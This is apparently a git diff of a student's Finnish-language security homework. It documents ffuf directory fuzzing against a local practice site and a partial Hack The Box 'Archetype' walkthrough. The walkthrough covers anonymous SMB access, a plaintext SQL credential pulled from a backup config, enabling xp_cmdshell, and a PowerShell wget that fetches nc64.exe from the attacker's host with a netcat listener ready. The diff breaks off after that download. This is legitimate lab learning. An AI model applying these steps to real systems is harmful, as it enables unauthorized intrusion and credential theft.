@@ -91,27 +91,43 @@ Alla linkki dataan.
 
 https://easyupload.io/ng17si
 
-# e) 
+# e) FUZZ
 
+Seurasin Teron ohjetta virtuaaliympäristön laatimiseen. (https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)
 
+![kuva](https://github.com/user-attachments/assets/9f823330-280f-4e06-a803-cbfc7299d462)
 
+Sivu toimi osoitteessa 127.0.0.2:8000 komennon ajamisen jälkeen, eli ympäristö toimi.
+Seuraavaksi latasin ja purin ffufin Teron ohjeessa olevilla komennoilla.
 
+![kuva](https://github.com/user-attachments/assets/ec3bd71c-de57-47e5-a652-ec8bdd6cb9d3)
 
+Lataus toimi ja ohjelma käynnistyi.
 
+Seuraavaksi latasin hakemiston, jossa oli yleisimmät hakemistot, jotta voin fuzzata (koettaa tietyn sanan tilalla listan hakusanoja) ja hakea siten yleisimpiä hakemistoja, jotka on voinut jäädä salaamatta tai vahingossa verkkoon.
 
+Hain sen Teron ohjeessa olevalla komennolla.
 
+Seuraavaksi rakensin komennon sivun fuzzaamiseen. Yritin komentoa './ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ' komennossa '-w common.txt' määrittää käytetyn sanalistan ja '-u http://127.0.0.2:8000/' kohde osoitteen. Sana FUZZ määrittää mitä sanaa ohjelma muuttaa eri hauilla. Ajoin komennon.
 
+Samoin kuten Teron ohjeessa, myös tässä osassa kaikki näyttivät statusta 200, eli haku onnistui. Se ei kuitenkaan auta tässä tilanteessa, sillä kaikki toimivat. Ohjeeseen verrattuna erona on, että kaikki vastaukset ovat 154 tavua pitkiä. Muokkaan Teron ohjeen mukaisesti omaa komentoani muotoon '/ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 154'.
+'-fs' filtteröi vastauksen koon mukaan.
+Ajoin komennon uudelleen.
 
+![kuva](https://github.com/user-attachments/assets/28b6f596-d1f1-4dba-97e7-cbbfa734d927)
 
+Tällä kertaa sain vastukseksi pienemmän listan.
+Koetin hakea näitä 'curl' komennolla.
 
+![kuva](https://github.com/user-attachments/assets/0292105d-de94-443c-a16b-43829235d504)
 
+.git hakemistot antoivat samankaltaiset vastaukset, jossa näkyi lippu.
 
+Sain saman vastauksen myös löydetysttä wp-admin sivusta. Sivu aukesi myös selaimella.
 
+![kuva](https://github.com/user-attachments/assets/011ee359-708d-4688-ae0b-01b6701fae90)
 
-
-
-
-
+Totesin Fuzzauksen onnistuneeksi.
 
 # f) HTB
 
@@ -202,20 +218,151 @@ Kone löytyi. Totesin kuitenkin, että aiemmin tekemäni muutokset iptablesilla 
 Aloitin hyökkäyksen skannaamalla aktiiviset portit komennolla 'sudo nmap -A -p- 10.10.11.23'.
 
 Yrittäessäni tehdä seuraavaa askelta ja katsoa auki porttiskannauksesta löytynyttä http osoitetta, totesin että verkkosivut toimivat äärimmäisen hitaasti eivätkä suostu avautumaan.
-Sama toistui toista konetta yrittäessäni. Päätin tässä vaiheessa siirtyä askeleen taakse päin ja tehdä lisää Starting Point harjoituksia, koska ne tuntuivat enemmän omalle tasolleni sopivilta.
+Sama toistui toista konetta yrittäessäni. Päätin tässä vaiheessa ylipäätään siirtyä askeleen taakse päin ja tehdä lisää Starting Point harjoituksia, koska ne tuntuivat enemmän omalle tasolleni sopivilta.
 
-Aloitin harjoituksen Appointment
+*12.11.2024 klo 20:09*
 
-## Appointment 
+Edelliset tehtävät jäivät kesken, sillä mikään verkkosivu ei jaksanut ladata. Päätin yrittää ottaa eri VPN vaihtoehdon ja dokumentoida tämän vaiheen myös paremmin. Aloitin lataamalla haluamani VPN vaihtoehdon HTB:n sivuilta
 
-Vastasin ensimmäisiin kysymyksiin samalla kun ajoin komentoa 'sudo nmap -sV 10.129.225.218' skannatakseni kohdekoneen portit
+![kuva](https://github.com/user-attachments/assets/4121bde9-8455-42f2-8941-818d01dfdeac)
 
-![kuva](https://github.com/user-attachments/assets/4e81bb94-5fa9-44c6-a9d2-5ccab60a9e05)
+Klikkasin ruudun yläreunassa olevaa ethernet portin kuvaa ja vein hiiren VPN Connections painikkeen päälle ja valitisn Add a VPN connection
 
-Skannauksesta totesin, että vain yksi portti on auki. Se on 80 ja sitä kuuntelee Apache.
+![kuva](https://github.com/user-attachments/assets/bc4cd240-7e2f-4a14-b374-6161f5d0cf6d)
 
-Jatkoin yksinkertaisiin kysymyksiin vastailua, kunnes tuli kysymys, mikä on työkalun gobuster kansioita hakevan komennon nimi.
-Vastauksen löysin kalin verkkosivuilta. Se on 'Dir' (https://www.kali.org/tools/gobuster/)
+Valitsin alasvetovalikosta "Import a saved VPN configuration..." ja painoin Create
+
+![kuva](https://github.com/user-attachments/assets/7640136f-87d5-4005-8362-969d6cfc3fd3)
+
+Valitsin haluemani tiedoston ja sain painoin seuraavassa ruudussa "Save"
+
+![kuva](https://github.com/user-attachments/assets/4ac25ea4-98fb-468e-ad93-6fb3ac65fa4e)
+
+Lopuksi valitsin alussa näyttämästäni alasvetovalikosta oikean yhteyden.
+Koetin yhteyttä pingaamalla tuttuja osoitteita
+
+![kuva](https://github.com/user-attachments/assets/75519892-f883-4097-be83-e547d8a1bb34)
+
+Kone ei ole yhteydessä julkiseen verkkoon. Tämän takia teen toisella koneella itse tehtävän ja siitä näen myös, että yhteyden muodostaminen on onnistunut.
+
+![kuva](https://github.com/user-attachments/assets/8c98e182-0037-464d-a364-cd84424a580d)
+
+## Archetype
+
+Valitsin ensimmäiseksi kohteekseni harjoituksen Archetype. Loin koneen ja odotin sen käynnistämistä.
+
+Asia on itselleni uutta, niin käytän HTB:n tuottamaa ohjetta apuna niiltä osin, kun en itsenäisesti asiaa osaa.
+
+![kuva](https://github.com/user-attachments/assets/ee94cf17-cd01-4722-a669-c0600509ad6f)
+
+Sain yhteyden.
+
+Aloitin ajamalla täyden nmap skannauksen metasploitin kautta komennolla 'db_nmap -A -p- 10.129.145.0'
+
+Skannauksesta näin, että koneella on tietokanta auki portissa 1433
+
+Ohjeen mukaan yritän seuraavaksi kirjautua sisään smb (Server Message Block) palveluun. Skannauksesta näin sen olevan auki. Tein lisähaun palveluun komennolla 'smbclient -N -L \\\\10.129.145.0\\' '-N' näyttää kohteet, joissa ei ole salasanaa ja '-L' näyttää kohteen palvelut
+
+![kuva](https://github.com/user-attachments/assets/020beb10-76d0-49a2-96ec-91966fdc28bd)
+
+Yritin seuraavaksi päästä sisään käyttäjille komennolla 'smbclient -N \\\\10.129.145.0\\{kohde}' 
+
+Pääsin käsiksi backups ja IPC$ kansioihin. Muut vaativat salasanaa.
+
+![kuva](https://github.com/user-attachments/assets/9abb3c54-46b8-4d22-8cb2-893254ee1eae)
+
+Näistä backups kuulosti mielenkiintoisemmalta.
+
+Löysin kansiosta tiedoston nimeltä prod.dtsConfig. Tässä vaiheessa tuli kuitenkin pieni ongelma itselleni, sillä en osannut Windows koneessa tehdä niinkään yksinkertaista toimintoa, kuin lukea tiedostoa. Katsoin ohjeesta ja siellä suositeltiin lataamaan tiedosto 'get' komennolla. Tein sen.
+
+![kuva](https://github.com/user-attachments/assets/04f86a1f-18bb-400f-a2b2-37c13bd37d78)
+
+Tiedostosta löytyi selkokielinen salasana ja käyttäjä ilmeisesti sql_svc palveluun.
+
+![kuva](https://github.com/user-attachments/assets/3fc92fb2-4d36-4b23-868c-a75e021f3844)
+
+Koetin seuraavaksi katsoa tietokannastani onko tällaista palvelua avoinna.
+
+![kuva](https://github.com/user-attachments/assets/52c320a1-a4e5-4823-9b23-51f66bc616c7)
+
+SQL palvelin on auki portissa 1433.
+
+HTB seuraavana tehtävänä oli avata seuraavaksi yhteys Microsoft SQL Serveriin Impacket kokoelman scriptillä. Nopealla googlausella löysin sen olevan 'mssqlclient.py' (https://www.kali.org/tools/impacket-scripts/).
+Katsoin ohjeesta komentoa ja totesin ohjeen olevan melko sekava.
+
+![kuva](https://github.com/user-attachments/assets/9497cc94-235d-4a17-a84f-fe1a6b9bd90c)
+
+Katsoin esimerkin ohjeesta ja sain komennoksi
+'impacket-mssqlclient.py ARCHETYPE/sql_svc@10.129.145.0 -windows-auth'
+- ARCHETYPE/sql_svc on käyttäjä
+- 10.129.145.0 on kohteen osoite
+- -windows-auth laittaa windowsin oman tunnistuksen päälle
+  
+![kuva](https://github.com/user-attachments/assets/0fb6986f-c8b8-4879-a223-1ea9c24e760f)
+
+Olin sisällä. Seuraavaksi piti hakea komento, jolla saadaan shell auki.
+
+(https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)
+
+Tämän Microsoft ystävällisesti opetti minulle olevan xp_cmdshell.
+
+Komento oli kuitenkin estetty. Onneksi Microsoft opetti minulle kuinka se avataan. (https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16)
+Käytetyt komennot alla:
+
+![kuva](https://github.com/user-attachments/assets/17724b11-0296-402c-aded-85c05bc6e4f9)
+
+Sain oikeudet muutettua, mutta tässä vaiheessa minulla loppui oma osaaminen ja päädyin ohjeen pariin.
+
+Seuraavassa vaiheessa latasin haitallisen ohjelman, laitoin yksinkertaisen http palvelimen ja avasin kuuntelevan portin netcatilla.
+
+Tein sen komennolla 'sudo python3 -m http.server 80' ja 'sudo nc -lvnp 443'
+
+Seuraavaksi palasin tietokantaan ja avasin PowerShellin komennolla 'xp_cmdshell "powershell -c pwd"
+
+Seuraavassa vaiheessa lataamme avatusta Kalin palvelimesta ohjelman, jolla voimme nostaa oikeuksia. Lataus tapahtuu komennolla 'xp_cmdshell "powershell -c cd C:Users\sql_svc\Downloads; wget http://10.10.14.233/nc64.exe -outfile nc64.exe"'
+
+![kuva](https://github.com/user-attachments/assets/93dc8b3b-b83b-4f10-9784-d5aa7519191f)
+
+Palvelin antoi vastauksen 200, eli tämä oletettavasti onnistui.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
